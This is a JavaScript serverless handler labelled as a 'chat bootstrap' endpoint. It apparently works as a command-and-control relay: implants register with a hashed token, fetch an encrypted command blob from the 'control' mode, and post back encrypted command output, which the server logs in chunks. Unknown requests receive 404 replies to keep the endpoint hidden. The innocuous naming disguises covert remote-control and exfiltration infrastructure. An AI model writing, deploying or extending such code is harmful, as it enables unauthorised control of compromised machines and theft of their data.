import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '34';
const CONTROL_PAYLOAD = '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';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) {
    chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  }
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) {
      console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    }
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
